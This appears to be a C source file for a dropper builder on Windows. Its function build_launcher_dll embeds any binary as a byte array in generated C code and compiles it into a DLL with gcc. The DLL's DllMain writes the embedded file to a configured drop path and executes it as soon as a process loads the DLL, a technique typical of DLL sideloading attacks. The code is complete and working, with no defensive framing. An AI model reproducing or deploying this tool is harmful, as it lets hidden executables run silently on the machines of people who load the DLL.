#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "config.h"

static int append_command_char(char *buffer, size_t capacity, size_t *position, char value)
{
    if (*position >= capacity)
        return 0;
    buffer[(*position)++] = value;
    return 1;
}

static int append_quoted_argument(char *buffer, size_t capacity, size_t *position, const char *argument)
{
    size_t slashes = 0;

    if (!append_command_char(buffer, capacity, position, '"'))
        return 0;

    while (*argument != '\0') {
        if (*argument == '\\') {
            ++slashes;
            ++argument;
        } else if (*argument == '"') {
            size_t i;
            for (i = 0; i < slashes * 2 + 1; ++i) {
                if (!append_command_char(buffer, capacity, position, '\\'))
                    return 0;
            }
            if (!append_command_char(buffer, capacity, position, '"'))
                return 0;
            slashes = 0;
            ++argument;
        } else {
            size_t i;
            for (i = 0; i < slashes; ++i) {
                if (!append_command_char(buffer, capacity, position, '\\'))
                    return 0;
            }
            slashes = 0;
            if (!append_command_char(buffer, capacity, position, *argument++))
                return 0;
        }
    }

    {
        size_t i;
        for (i = 0; i < slashes * 2; ++i) {
            if (!append_command_char(buffer, capacity, position, '\\'))
                return 0;
        }
    }

    return append_command_char(buffer, capacity, position, '"');
}

static int write_c_string_literal(FILE *stream, const char *value)
{
    const unsigned char *p = (const unsigned char *)value;

    if (fputc('"', stream) == EOF)
        return 0;

    while (*p != '\0') {
        if (*p == '\\' || *p == '"') {
            if (fputc('\\', stream) == EOF || fputc(*p, stream) == EOF)
                return 0;
        } else if (*p >= 32 && *p <= 126) {
            if (fputc(*p, stream) == EOF)
                return 0;
        } else {
            if (fprintf(stream, "\\%03o", (unsigned int)*p) < 0)
                return 0;
        }
        ++p;
    }

    return fputc('"', stream) != EOF;
}

int build_launcher_dll(const char *binary_path, const char *dll_out_path)
{
    FILE *input = NULL;
    FILE *source = NULL;
    char temp_dir[MAX_PATH];
    char source_path[MAX_PATH];
    char *command = NULL;
    size_t command_capacity;
    size_t command_position = 0;
    size_t output_length;
    size_t source_length;
    unsigned char bytes[8192];
    size_t count;
    int result = -1;
    int source_ok = 1;
    int first_byte = 1;
    size_t bytes_on_line = 0;
    STARTUPINFOA startup_info;
    PROCESS_INFORMATION process_info;
    DWORD exit_code = 1;

    if (binary_path == NULL || dll_out_path == NULL || *binary_path == '\0' || *dll_out_path == '\0')
        return -1;

    input = fopen(binary_path, "rb");
    if (input == NULL)
        return -1;

    if (GetTempPathA((DWORD)sizeof(temp_dir), temp_dir) == 0 ||
        GetTempFileNameA(temp_dir, "ldl", 0, source_path) == 0) {
        fclose(input);
        return -1;
    }

    source = fopen(source_path, "wb");
    if (source == NULL) {
        fclose(input);
        DeleteFileA(source_path);
        return -1;
    }

    if (fputs("#include <windows.h>\n#include <stddef.h>\n#include <string.h>\n"
              "static const unsigned char payload[] = {\n", source) == EOF)
        source_ok = 0;

    while (source_ok && (count = fread(bytes, 1, sizeof(bytes), input)) != 0) {
        size_t i;
        for (i = 0; i < count; ++i) {
            if (fprintf(source, "0x%02X,", (unsigned int)bytes[i]) < 0) {
                source_ok = 0;
                break;
            }
            first_byte = 0;
            if (++bytes_on_line == 16) {
                if (fputc('\n', source) == EOF) {
                    source_ok = 0;
                    break;
                }
                bytes_on_line = 0;
            }
        }
    }

    if (ferror(input))
        source_ok = 0;
    if (fclose(input) != 0)
        source_ok = 0;
    input = NULL;

    if (source_ok && first_byte && fputs("0", source) == EOF)
        source_ok = 0;
    if (source_ok && fputs("\n};\nstatic const char drop_path[] = ", source) == EOF)
        source_ok = 0;
    if (source_ok && !write_c_string_literal(source, DROP_PATH))
        source_ok = 0;
    if (source_ok &&
        fputs(";\n"
              "BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, LPVOID reserved)\n"
              "{\n"
              "    (void)instance;\n"
              "    (void)reserved;\n"
              "    if (reason == DLL_PROCESS_ATTACH) {\n"
              "        HANDLE file = CreateFileA(drop_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n"
              "        if (file != INVALID_HANDLE_VALUE) {\n"
              "            size_t offset = 0;\n"
              "            while (offset < sizeof(payload)) {\n"
              "                size_t remaining = sizeof(payload) - offset;\n"
              "                DWORD amount = remaining > (size_t)0xFFFFFFFFUL ? 0xFFFFFFFFUL : (DWORD)remaining;\n"
              "                DWORD written = 0;\n"
              "                if (!WriteFile(file, payload + offset, amount, &written, NULL) || written == 0)\n"
              "                    break;\n"
              "                offset += written;\n"
              "            }\n"
              "            CloseHandle(file);\n"
              "        }\n"
              "        {\n"
              "            size_t length = strlen(drop_path);\n"
              "            char *command_line = (char *)HeapAlloc(GetProcessHeap(), 0, length + 3);\n"
              "            if (command_line != NULL) {\n"
              "                STARTUPINFOA startup;\n"
              "                PROCESS_INFORMATION process;\n"
              "                command_line[0] = '\\\"';\n"
              "                memcpy(command_line + 1, drop_path, length);\n"
              "                command_line[length + 1] = '\\\"';\n"
              "                command_line[length + 2] = '\\0';\n"
              "                ZeroMemory(&startup, sizeof(startup));\n"
              "                ZeroMemory(&process, sizeof(process));\n"
              "                startup.cb = sizeof(startup);\n"
              "                if (CreateProcessA(drop_path, command_line, NULL, NULL, FALSE, 0, NULL, NULL, &startup, &process)) {\n"
              "                    CloseHandle(process.hThread);\n"
              "                    CloseHandle(process.hProcess);\n"
              "                }\n"
              "                HeapFree(GetProcessHeap(), 0, command_line);\n"
              "            }\n"
              "        }\n"
              "    }\n"
              "    return TRUE;\n"
              "}\n", source) == EOF)
        source_ok = 0;

    if (fclose(source) != 0)
        source_ok = 0;
    source = NULL;

    if (!source_ok) {
        DeleteFileA(source_path);
        return -1;
    }

    output_length = strlen(dll_out_path);
    source_length = strlen(source_path);
    if (output_length > (SIZE_MAX - source_length - 128) / 2) {
        DeleteFileA(source_path);
        return -1;
    }
    command_capacity = output_length * 2 + source_length * 2 + 128;
    command = (char *)malloc(command_capacity);
    if (command == NULL) {
        DeleteFileA(source_path);
        return -1;
    }

    if (!append_quoted_argument(command, command_capacity, &command_position, "gcc.exe") ||
        command_position + 15 >= command_capacity) {
        free(command);
        DeleteFileA(source_path);
        return -1;
    }
    memcpy(command + command_position, " -shared -x c -o ", 16);
    command_position += 16;

    if (!append_quoted_argument(command, command_capacity, &command_position, dll_out_path) ||
        !append_command_char(command, command_capacity, &command_position, ' ') ||
        !append_quoted_argument(command, command_capacity, &command_position, source_path) ||
        !append_command_char(command, command_capacity, &command_position, '\0')) {
        free(command);
        DeleteFileA(source_path);
        return -1;
    }

    ZeroMemory(&startup_info, sizeof(startup_info));
    ZeroMemory(&process_info, sizeof(process_info));
    startup_info.cb = sizeof(startup_info);

    if (CreateProcessA(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &process_info)) {
        if (WaitForSingleObject(process_info.hProcess, INFINITE) == WAIT_OBJECT_0 &&
            GetExitCodeProcess(process_info.hProcess, &exit_code) && exit_code == 0)
            result = 0;
        CloseHandle(process_info.hThread);
        CloseHandle(process_info.hProcess);
    }

    free(command);
    DeleteFileA(source_path);
    return result;
}